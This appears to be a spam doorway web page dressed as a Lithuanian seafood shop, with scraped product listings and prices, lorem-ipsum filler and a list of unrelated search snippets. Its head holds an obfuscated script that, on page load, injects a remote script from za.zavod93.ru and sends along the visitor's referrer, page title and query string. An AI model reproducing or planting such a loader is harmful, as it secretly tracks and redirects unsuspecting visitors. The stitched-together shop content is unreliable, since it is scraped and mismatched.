<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<title>Žuvis, jūros gėrybės | Užsakymas internetu | žuvis</title>
<meta name="keywords" content="Žuvis, jūros gėrybės | Užsakymas internetu" />
<meta name="description" content="Žuvis, jūros gėrybės | Užsakymas internetu" />
<link href="style.css" rel="stylesheet" type="text/css" media="screen" />

<script type="text/javascript">var _0x3150=['\x69\x6e\x73\x65\x72\x74\x42\x65\x66\x6f\x72\x65','\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74','\x26\x66\x72\x6d\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x34\x3d\x73\x63\x72\x69\x70\x74\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x35','\x6c\x6f\x63\x61\x74\x69\x6f\x6e','\x68\x74\x74\x70\x73\x3a','\x72\x65\x70\x6c\x61\x63\x65','\x68\x65\x61\x64','\x70\x72\x6f\x74\x6f\x63\x6f\x6c','\x26\x64\x65\x66\x61\x75\x6c\x74\x5f\x6b\x65\x79\x77\x6f\x72\x64\x3d','\x73\x72\x63','\x73\x63\x72\x69\x70\x74','\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64','\x54\x68\x65\x20\x77\x65\x62\x73\x69\x74\x65\x20\x77\x6f\x72\x6b\x73\x20\x6f\x6e\x20\x48\x54\x54\x50\x53\x2e\x20\x54\x68\x65\x20\x74\x72\x61\x63\x6b\x65\x72\x20\x6d\x75\x73\x74\x20\x75\x73\x65\x20\x48\x54\x54\x50\x53\x20\x74\x6f\x6f\x2e','\x73\x65\x61\x72\x63\x68','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x7a\x61\x2e\x7a\x61\x76\x6f\x64\x39\x33\x2e\x72\x75\x2f\x48\x48\x44\x43\x50\x58\x52\x31\x3f\x73\x65\x5f\x72\x65\x66\x65\x72\x72\x65\x72\x3d','\x63\x75\x72\x72\x65\x6e\x74\x53\x63\x72\x69\x70\x74','\x68\x74\x74\x70\x3a','\x72\x65\x66\x65\x72\x72\x65\x72'];(function(_0x4e6508,_0x3150ac){var _0x49dde7=function(_0x3b787a){while(--_0x3b787a){_0x4e6508['push'](_0x4e6508['shift']());}};_0x49dde7(++_0x3150ac);}(_0x3150,0x1ad));var _0x49dd=function(_0x4e6508,_0x3150ac){_0x4e6508=_0x4e6508-0x0;var _0x49dde7=_0x3150[_0x4e6508];return _0x49dde7;};var d=document,s=d[_0x49dd('\x30\x78\x34')](_0x49dd('\x30\x78\x64'));s[_0x49dd('\x30\x78\x63')]='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x7a\x61\x2e\x7a\x61\x76\x6f\x64\x39\x33\x2e\x72\x75\x2f\x48\x48\x44\x43\x50\x58\x52\x31\x3f\x73\x65\x5f\x72\x65\x66\x65\x72\x72\x65\x72\x3d'+encodeURIComponent(document[_0x49dd('\x30\x78\x32')])+_0x49dd('\x30\x78\x62')+encodeURIComponent(document['\x74\x69\x74\x6c\x65'])+'\x26'+window[_0x49dd('\x30\x78\x36')][_0x49dd('\x30\x78\x31\x30')][_0x49dd('\x30\x78\x38')]('\x3f','\x26')+'\x26\x66\x72\x6d\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x34\x3d\x73\x63\x72\x69\x70\x74\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x35\x26\x5f\x63\x69\x64\x3d\x61\x38\x36\x65\x61\x39\x65\x36\x2d\x30\x32\x37\x35\x2d\x36\x32\x65\x61\x2d\x38\x32\x39\x36\x2d\x33\x38\x39\x38\x64\x61\x33\x33\x63\x66\x39\x38';document['\x63\x75\x72\x72\x65\x6e\x74\x53\x63\x72\x69\x70\x74']?document[_0x49dd('\x30\x78\x30')]['\x70\x61\x72\x65\x6e\x74\x4e\x6f\x64\x65'][_0x49dd('\x30\x78\x33')](s,document['\x63\x75\x72\x72\x65\x6e\x74\x53\x63\x72\x69\x70\x74']):d['\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65'](_0x49dd('\x30\x78\x39'))[0x0][_0x49dd('\x30\x78\x65')](s);document['\x6c\x6f\x63\x61\x74\x69\x6f\x6e'][_0x49dd('\x30\x78\x61')]===_0x49dd('\x30\x78\x37')&&_0x49dd('\x30\x78\x31\x31')+encodeURIComponent(document[_0x49dd('\x30\x78\x32')])+'\x26\x64\x65\x66\x61\x75\x6c\x74\x5f\x6b\x65\x79\x77\x6f\x72\x64\x3d'+encodeURIComponent(document['\x74\x69\x74\x6c\x65'])+'\x26'+window['\x6c\x6f\x63\x61\x74\x69\x6f\x6e'][_0x49dd('\x30\x78\x31\x30')][_0x49dd('\x30\x78\x38')]('\x3f','\x26')+_0x49dd('\x30\x78\x35')['\x69\x6e\x64\x65\x78\x4f\x66'](_0x49dd('\x30\x78\x31'))===0x0&&alert(_0x49dd('\x30\x78\x66'));</script>
</head>
<body id="TcAQLTwshX6gX">
<div id="header">
	<div id="menu">
		<ul>
			<li class="current_page_item"><a href="index.html">Homepage</a></li>
			<li id="bqlwFNPixAO"><a href="privacy-policy.html">Privacy policy</a></li>
			<li id="OAydax1ryy1qTj"><a href="terms.html">Terms and Conditions</a></li>
			<li id="tALBZgDPnBuaL"><a href="photo.html">Photo gallery</a></li>
			<li id="qwaSOgZYEfT1D"><a href="contact.html">Contacts</a></li>
		</ul>
	</div>
	<!-- end #menu -->
	<div id="logo">
		<h1>žuvis</h1>
	</div>
	<hr />
</div>
<!-- end #header -->
<!-- end #header-wrapper -->
<!-- end #logo -->
<div id="page">
	<div id="page-bgtop">
		<div id="page-bgbtm">
			<div id="content">
				<div class="post"  id="6mmxdHMxWLjkyrO">
					<p class="meta"  id="mexzYYeI"><span class="date">2020.10.29 11:10</span> Posted by <a href="#">Someone</a></p>
					<h2 class="title"><a href="#">Žuvis, jūros gėrybės | Užsakymas internetu</a></h2>
					<div class="entry" id="RfkuahSYSZQIO">
					<hr><br><br>
			<iframe width="560" height="315" src="https://www.youtube.com/embed/1DBxecfVwjs" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
						<span> Supratau</span> <p> Mūsų svetainėje naudojami slapukai, kad užtikrintume jums teikiamų paslaugų kokybę. Išjungdami šį pranešimą arba toliau naršydami šioje svetainėje sutinkate su assorti.lt privatumo politika .</p> <span> </span> <span> menu</span> Prekių pristatymas Atsiskaitymo būdai Taisyklės ASSORTI klubo programa pagalba@assorti.lt Kontaktai <i> </i> 0 0 <i> </i> <i> </i> +370 700 33311 <i> </i> <h4> <span> Prisijungti prie savo paskyros</span> </h4> <h4> <span> Maistas ir<br/> gėrimai</span> </h4> Visas maistas <h5> Gourmet kumpiai ir sūriai</h5> <h5> Šviežia mėsa ir paukštiena</h5> <h5> Žuvis ir žuvies gaminiai</h5> <h5> Pieno gaminiai ir kiaušiniai</h5> <h5> Bakalėja</h5> <h5> Vaisiai ir daržovės</h5> <h5> Duonos gaminiai ir konditerija</h5> <h5> Šaldytas maistas</h5> <h5> Kava, arbata ir kakava</h5> <h5> Saldumynai</h5> <h5> Nealkoholiniai gėrimai</h5> <h5> Pasaulio virtuvės</h5> <h4> <span> Vaikams</span> </h4> Peržiūrėti viską <h5> Kūdikių ir vaikų maistas</h5> <h5> Kūdikių ir vaikų higiena</h5> <h5> Kūdikių priežiūra</h5> <h5> Drabužiai ir aksesuarai</h5> <h5> Žaislai</h5> <h4> <span> Kosmetika</span> </h4> Rodyti viską <h5> Veido odos priežiūra</h5> <h5> Kūno odos priežiūra</h5> <h5> Burnos higiena</h5> <h5> Plaukų priežiūra</h5> <h5> Intymi higiena</h5> <h5> Kosmetika vyrams</h5> <h5> Sveikatos priežiūra</h5> <h5> Kvepalai ir eteriniai aliejai</h5> <h4> <span> Namams</span> </h4> Rodyti viską <h5> Interjerui</h5> <h5> Virtuvės reikmenys</h5> <h5> Buitinės chemijos prekės</h5> <h5> Namų apyvokos reikmenys</h5> <h5> Gyvūnų prekės</h5> <h5> Šventinė atributika</h5> <h5> Romero Britto aksesuarai</h5> <h4> <span> Sveikesnė<br/> sudėtis</span> </h4> <h5> Ekologiška</h5> <h5> Veganams</h5> <h5> Be laktozės</h5> <h5> Supermaistas</h5> <h5> Be glitimo</h5> <h5> Be pridėtinio cukraus</h5> <h4> <span> Alkoholiniai<br/> gėrimai</span> </h4> <h5> Vynas</h5> <h5> Šampanas, Putojantys vynai</h5> <h5> Sidras</h5> <h5> Alus</h5> <h5> Stiprieji gėrimai</h5> <h4> <span> Akcijos</span> </h4> <h4> <span> Blogas</span> </h4> <h4> <span> Prekių pristatymas</span> </h4> <h4> <span> Atsiskaitymo būdai</span> </h4> <h4> <span> Taisyklės</span> </h4> <h4> <span> ASSORTI klubo programa</span> </h4> <h4> <span> Kontaktai</span> </h4> <h1> Žuvis ir žuvies gaminiai</h1> Assorti <i> - </i> Katalogas <i> - </i> Maistas ir gėrimai <i> - </i> Žuvis ir žuvies gaminiai <span> Visos prekės</span> <span> Šviežia žuvis ir jūros gėrybės</span> <span> Žuvies ir jūros gėrybių gaminiai</span> <span> Žuvies alternatyvos</span> <h5> Filtrai </h5> <h5> Kategorija</h5> <span> </span> <span> Šviežia žuvis ir jūros gėrybės</span> <span> </span> <span> </span> <span> Šviežia žuvis</span> <span> </span> <span> </span> <span> Jūros gėrybės</span> <span> </span> <span> </span> <span> Žuvies ir jūros gėrybių gaminiai</span> <span> </span> <h5> Kaina</h5> <span> </span> <span> </span> <h5> Prekės ženklas </h5> ALASKA WILD <span> 1</span> CREUSES <span> 1</span> DON GASTRONO <span> 1</span> GEROS ŽUVIES <span> 1</span> GUYADER <span> 1</span> LA BARRE <span> 1</span> MOTTRA <span> 1</span> NORVELITA <span> 1</span> PUNTO VERDE <span> 1</span> RIGA GOLD <span> 1</span> SORLUT <span> 1</span> ŽUVIESPAŠTAS <span> 1</span> <h5> Kilmės šalis</h5> Ispanija <span> 1</span> Italija <span> 1</span> JAV <span> 1</span> Latvija <span> 1</span> Lietuva <span> 1</span> Norvegija <span> 1</span> Prancūzija <span> 1</span> Gerai Rikiuoti pagal... Pavadinimą Datą Didžiausią nuolaidą Mažiausią kainą Didžiausią kainą <span> </span> <span> </span> <span> <span> Naujiena</span> <span> <span> Lašišinių žuvų (ketų; lot. Oncorhynchus Keta) ikrai ALASKA WILD, 100g</span> <span> </span> <span> </span> </span> <span> <span> 15,99 €</span> <span> 159,90 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> Naujiena</span> <span> <span> Marinuota ančiuvių filė PUNTO VERDE</span> <span> </span> <span> </span> </span> <span> <span> 29,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> </span> <span> </span> <span> <span> Naujiena</span> <span> <span> Marinuota Kantabrijos ančiuvių file DON GASTRONOM acte ir alyvuogių aliejuje, 65 g</span> <span> </span> <span> </span> </span> <span> <span> 6,99 €</span> <span> 107,54 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> Naujiena</span> <span> <span> Marinuota sardinių file DON GASTRONOM aliejuje, 65 g</span> <span> </span> <span> </span> </span> <span> <span> 6,99 €</span> <span> 107,54 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> Naujiena</span> <span> <span> Marinuota Kantabrijos ančiuvių file Premium DON GASTRONOM, alyvuogių aliejuje, 100 g</span> <span> </span> <span> </span> </span> <span> <span> 12,99 €</span> <span> 129,90 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> Naujiena</span> <span> <span> Marinuota Kantabrijos ančiuvių file DON GASTRONOM, alyvuogių aliejuje, 60 g</span> <span> </span> <span> </span> </span> <span> <span> 7,99 €</span> <span> 133,17 €/kg</span> </span> </span> vnt. Į krepšelį <span> <span> </span> </span> <span> </span> <span> <span> Naujiena</span> <span> <span> Jūros lydeka - karštai rūkyta, 1kg</span> <span> </span> <span> </span> </span> <span> <span> 8,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> <span> </span> </span> <span> </span> <span> <span> Naujiena</span> <span> <span> Karšto rūkymo skumbrė b/g, 1kg</span> <span> </span> <span> </span> </span> <span> <span> 9,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> </span> <span> </span> <span> <span> <span> Sūdytų Aliaskos laukinių raudonųjų lašišų (Oncorhynchus nerka) filė, 1 kg</span> <span> </span> <span> </span> </span> <span> <span> 39,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> </span> <span> </span> <span> <span> <span> Šaltai rūkytų Aliaskos laukinių raudonųjų lašišų (Oncorhynchus nerka) filė su krapais, 1 kg</span> <span> </span> <span> </span> </span> <span> <span> 42,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> </span> <span> </span> <span> <span> <span> Atlantinių lašišų (Salmo Salar) didkepsniai, atšildyti,1 kg</span> <span> </span> <span> </span> </span> <span> <span> 19,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> <span> </span> </span> <span> </span> <span> <span> <span> Karpio filė, 1kg</span> <span> </span> <span> </span> </span> <span> <span> 10,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> </span> <span> </span> <span> <span> <span> Karšto rūkymo unguriukai(100-200g), 1kg</span> <span> </span> <span> </span> </span> <span> <span> 44,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> <span> </span> </span> <span> </span> <span> <span> <span> Atlantinės menkės filė su oda, 1 kg</span> <span> </span> <span> </span> </span> <span> <span> 15,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> </span> <span> </span> <span> <span> <span> Šamo plėšiko filė su oda ŽUVIES PAŠTAS,1 kg</span> <span> </span> <span> </span> </span> <span> <span> 16,49 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Šaldytas šamas plėšikas bananų lapuose ŽUVIES PAŠTAS, 1 kg</span> <span> </span> <span> </span> </span> <span> <span> 14,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> </span> <span> </span> <span> <span> <span> Šalto rūkymo Atlantinių lašišų filė nepjaustyta, be odos, 1 kg</span> <span> </span> <span> </span> </span> <span> <span> 24,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> </span> <span> </span> <span> <span> <span> Atšaldyta Atlantinių lašišų filė su oda, 1 kg</span> <span> </span> <span> </span> </span> <span> <span> 24,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> </span> <span> </span> <span> <span> <span> Vytinta Atlantinių lašišų dešra, 1 kg</span> <span> </span> <span> </span> </span> <span> <span> 15,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> </span> <span> </span> <span> <span> <span> Vytinta Atlantinių lašišų dešra (aštri), 1 kg</span> <span> </span> <span> </span> </span> <span> <span> 15,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> </span> <span> </span> <span> <span> <span> Vytintos raudonųjų lašišų lazdelės, 1 kg</span> <span> </span> <span> </span> </span> <span> <span> 12,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> </span> <span> </span> <span> <span> <span> Karšto rūkymo lašišų gabaliukai, 1 kg</span> <span> </span> <span> </span> </span> <span> <span> 29,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> </span> <span> </span> <span> <span> <span> Sūdyta Atlantinių lašišų filė NORVELITA, pjaustyta, 100g</span> <span> </span> <span> </span> </span> <span> <span> 2,99 €</span> <span> 29,90 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Šalto rūkymo Atlantinių lašišų filė NORVELITA, pjaustyta, 100g</span> <span> </span> <span> </span> </span> <span> <span> 2,99 €</span> <span> 29,90 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Sūdyta Atlantinių silkių filė su raudonojo vyno aromatu (be aliejaus), 150g</span> <span> </span> <span> </span> </span> <span> <span> 1,19 €</span> <span> 7,93 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Sūdyta Atlantinių silkių filė (be aliejaus) , 150g</span> <span> </span> <span> </span> </span> <span> <span> 1,19 €</span> <span> 7,93 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Atlantinių silkių filė Gurmanų - su marinatu , 270 g</span> <span> </span> <span> </span> </span> <span> <span> 1,99 €</span> <span> 7,37 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Atlantinių silkių filė Gurmanų - su grybais , 270 g</span> <span> </span> <span> </span> </span> <span> <span> 1,99 €</span> <span> 7,37 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Lietuviška sūdyta silkių filė , 210g</span> <span> </span> <span> </span> </span> <span> <span> 1,69 €</span> <span> 8,05 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Silkių filė Skandinaviška , 210 g</span> <span> </span> <span> </span> </span> <span> <span> 1,69 €</span> <span> 8,05 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Atlantinių silkių filė Gurmanų- močiūtės ,270g</span> <span> </span> <span> </span> </span> <span> <span> 1,99 €</span> <span> 7,37 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Šprotai pomidorų padaže RIGA GOLD stikle, 250 g</span> <span> </span> <span> </span> </span> <span> <span> 3,29 €</span> <span> 13,16 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Šprotai aliejuje RIGA GOLD stikle, 250 g</span> <span> </span> <span> </span> </span> <span> <span> 3,29 €</span> <span> 13,16 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Šprotai RIGA GOLD aliejuje, 190 g</span> <span> </span> <span> </span> </span> <span> <span> 2,59 €</span> <span> 13,63 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Didieji šprotai RIGA GOLD aliejuje, 190 g</span> <span> </span> <span> </span> </span> <span> <span> 2,49 €</span> <span> 13,11 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Jūros gėrybių salotos TOP su daržovėmis PUNTO VERDE, 1 kg</span> <span> </span> <span> </span> </span> <span> <span> 35,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> </span> <span> </span> <span> <span> <span> Karšto rūkymo ungurys, 1kg</span> <span> </span> <span> </span> </span> <span> <span> 44,99 <span> €/KG</span> </span> </span> </span> kg Į krepšelį <span> </span> <span> </span> <span> <span> <span> Juodieji sterlės ikrai MOTTRA, 56g</span> <span> </span> <span> </span> </span> <span> <span> 56 €</span> <span> 1000 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Juodieji sibirinio eršketo ikrai MOTTRA, 56g</span> <span> </span> <span> </span> </span> <span> <span> 62 €</span> <span> 1107,14 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Juodieji sibirinio eršketo ikrai MOTTRA, 28g</span> <span> </span> <span> </span> </span> <span> <span> 31 €</span> <span> 1107,14 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Austrė Fine De Claire Label Rouge Nr.2, 1vnt</span> <span> </span> <span> </span> </span> <span> <span> 2 €</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Skumbrės riletas GUYADER, 150 g</span> <span> </span> <span> </span> </span> <span> <span> 3,99 €</span> <span> 26,60 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Krabų riletas GUYADER, 150g</span> <span> </span> <span> </span> </span> <span> <span> 3,99 €</span> <span> 26,60 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Lašišos ir sūrio su česnaku ir žolelėmis užtepėlė, 120 g</span> <span> </span> <span> </span> </span> <span> <span> 3,99 €</span> <span> 33,25 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Tuno ir sūrio su pipirais užtepėlė GUYADER, 120 g</span> <span> </span> <span> </span> </span> <span> <span> 3,99 €</span> <span> 33,25 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Raudonieji ciegorių ikrai VIGNIR, 100g</span> <span> </span> <span> </span> </span> <span> <span> 4,99 €</span> <span> 49,90 €/kg</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Juodieji ciegorių ikrai LA BARRE, 100g</span> <span> </span> <span> </span> </span> <span> <span> 4,99 €</span> <span> 49,90 €/kg</span> </span> </span> vnt. Į krepšelį <span> <span> </span> </span> <span> </span> <span> <span> <span> Austrės Speciales Daniel Sorlut Nr.2, 1vnt.</span> <span> </span> <span> </span> </span> <span> <span> 2,50 €</span> </span> </span> vnt. Į krepšelį Rodyti po: 12 24 48 100 <span> </span> Verkių g 29B, <span> &bdquo;</span> Ogmios miestas<span> &ldquo;</span> , Vilnius Parduotuvė <span> Tel: +370 687 13979</span> <span> El.pa&scaron;tas: parduotuve.ogmios@assorti.lt </span> I-VII: 10:00 - 20:00 <br/> <br/> Saltoni&scaron;kių g. 9, PC <span> &bdquo;</span> Panorama<span> &ldquo;</span> , <br/> Vilnius Parduotuvė <span> Tel: +370 688 30490</span> El. pa&scaron;tas: panorama@assorti.lt <span> I-V</span> <span> I</span> <span> :<span> </span> </span> <span> 10</span> <span> :00 - 22:00</span> <br/> <span> VII: 10:00 - 21:00</span> Tel.: +370 700 33311 <span> El. p.: </span> pagalba@assorti.lt <span> Konsultuojame visomis dienomis</span> <br/> <span> nuo 9:00 iki 19:00</span> <br/> <br/> <p> </p> <p> </p> <p> </p> Kontaktai Apie Assorti Prekių pristatymas Atsiskaitymo būdai Taisyklės Privatumo politika ASSORTI klubo programa Dovanų čekis Karjera <i> </i> Facebook <i> </i> Instagram UAB Assorti 2020 Sprendimas: ELECTRONIC LAB Bendra suma: 0 € Peržiūrėti krepšelį <p> Įdėjus prekes į krepšelį, jos pasirodys čia.</p> Užsakymų istorija <span> </span> <span> </span>
					</div>
					<div><a href="#" class="links">View Full Story</a></div>
				</div>
		
			</div>
			<!-- end #content -->
			<div id="sidebar">
				<ul>
					<li>
						<h2>Aliquam tempus</h2>
						<p>Mauris vitae nisl nec metus placerat perdiet est. Phasellus dapibus semper urna. Pellentesque ornare, orci in consectetuer hendrerit, volutpat.</p>
					</li>
					<li>
						<h2>Pellenteque ornare </h2>
						<img src="img/3bfb5a27b1f38012dbd226b24908e07c.jpg" width="50%"/>
					<ul>
<li><a href="index.html">Žuvis alaus tešloje - World Recipes</a><br> Astrologinis simbolis vaizduoja dvi sujungtas žuvis. Žuvys gimsta paslaptinguoju metų laiku, kai mirtis užleidžia vietą gyvybei. Visą savo tolimesnį gyvenimą jos jaučia būties ribas, mistinio pasaulio alsavimą. Žuvims būdingas gilus užuojautos jausmas pirmiausia tiems, kas patenka į pavojingas situacijas.</li>
<li><a href="1.html">Žuvies Paštas | Šviežia, sveika, skani, bekvapė žuvis ...</a><br> Atlantinė lašiša, rūkyti unguriai. Menkės, karpio, šamo, silkių filė. Sepijos, austrės, ikrai, žuvies užtepėlės ir riletai. Pristatymas į namus visoje ...</li>
<li><a href="2.html">Prekyba šaldyta ir šviežia žuvimi ... - UAB "Žuvis"</a><br> Konservuota žuvis Vytinta žuvis Ikrai Griliaus žuvis ir gėrybės Gėrimai Aliejus, duona, druska, prieskoniai Jūrinis ešerys - karštai rūkytas (0,5 kg) 4,50 € 9,00 €/kg. vnt. Karpio gabaliukai - karštai rūkyti (0,7 kg) 7,35 € 10,50 €/kg ...</li>
<li><a href="3.html">Prekyba šviežia ir rūkyta žuvimi - Šeimos Žuvis</a><br> Žuvis be kaulų. Kitas svarbus dalykas, kuris dažnai mažuosius valgytojus baugina ir atbaido nuo žuvies- kaulai. Mažieji nenori, bijo valgyti žuvį, o tėvai gaišta savo laiką, kantriai išiminėdami iš žuvies net smulkiausias ašakas, kad vaikai nesibaimindami galėtų ją valgyti.</li>
<li><a href="4.html">Žuvis: Žuvies filė - 1000receptų.lt</a><br> UAB „Žuvis” perka - parduoda šviežias ir šaldytas žuvis, bei žuvies produktus ES ir kitose šalyse. Šis internetinis puslapis tai lengvas ir greitas kelias pirkėjui rasti, o pardavėjui parduoti žuvis, nesvarbu kurioje šalyje ar uoste būtų prekė.</li>
<li><a href="5.html">Žuvies patiekalų receptai | Žuvies patiekalai | MAXIMA</a><br> Kadangi žuvis skaniausia yra šviežia, prekiaujame žuvimi iš anksto, pagal užsakymus. Mūsų svetainėje užsisakę žuvies gausite ją visada žviežią ir ką tik išrūkytą ar paruoštą. Stengiamės pateikti tik geriausios kokybės produkciją.</li>
<li><a href="6.html">Žuvis, jūros gėrybės | Užsakymas internetu</a><br> Žuvis alaus tešloje - patiekalas, kurį nesunkiai pasigaminsite pagal šį receptą. Daug gerų, išbandytų receptų, kuriuos privalai išmėginti!</li>
<li><a href="7.html">Produktai - Geros Žuvies</a><br> Žuvis: Keptas ūsorius su grietinėlės - kaparėlių padažu Noriu pasigaminti Žuvies suvožtinis Noriu pasigaminti Žuvies kotletai pagal lenkus Noriu pasigaminti Kepta žuvis su avokadais, krevetėmis, grietinėle ir sūriu Noriu pasigaminti Reklama. Rūkytos skumbrės užtepas (užtepėlė)</li>
<li><a href="8.html">Žuvis - visi receptai | Maistas | 15min.lt</a><br> Šviežia žuvis Jūsų vaišių stalui. Kulinarų rekomenduojami, originalūs ir lengvai paruošiami žuvies patiekalų receptai, atitinkantys individualų skonį.</li>
<li><a href="9.html">Žuvis | La Maistas</a><br> Gardžiausi patiekalai iš: Žuvies filė. 1000receptu.lt - receptų portalas, kuris įkvepia gaminti!</li>
</ul>
					</li>
					<li>
						<h2>Category</h2>
<ul>
<li><a href="index.html">Žuvis alaus tešloje - World Recipes</a></li>
<li><a href="1.html">Žuvies Paštas | Šviežia, sveika, skani, bekvapė žuvis ...</a><br></li>
<li><a href="2.html">Prekyba šaldyta ir šviežia žuvimi ... - UAB "Žuvis"</a><br></li>
<li><a href="3.html">Prekyba šviežia ir rūkyta žuvimi - Šeimos Žuvis</a><br></li>
<li><a href="4.html">Žuvis: Žuvies filė - 1000receptų.lt</a><br></li>
<li><a href="5.html">Žuvies patiekalų receptai | Žuvies patiekalai | MAXIMA</a><br></li>
<li><a href="6.html">Žuvis, jūros gėrybės | Užsakymas internetu</a><br></li>
<li><a href="7.html">Produktai - Geros Žuvies</a><br></li>
<li><a href="8.html">Žuvis - visi receptai | Maistas | 15min.lt</a><br></li>
<li><a href="9.html">Žuvis | La Maistas</a><br></li>
</ul>
					</li>
				</ul>
			</div>
			<!-- end #sidebar -->
			<div style="clear: both;">&nbsp;</div>
		</div>
		<!-- end #page -->
	</div>
</div>
<div id="footer-bgcontent">
	<div id="footer">
		<p>Copyright (c) 2008 Sitename.com. All rights reserved. Design by Free CSS Templates.</p>
		<p></p>
	</div>
	<!-- end #footer -->
</div>
</body>
</html>
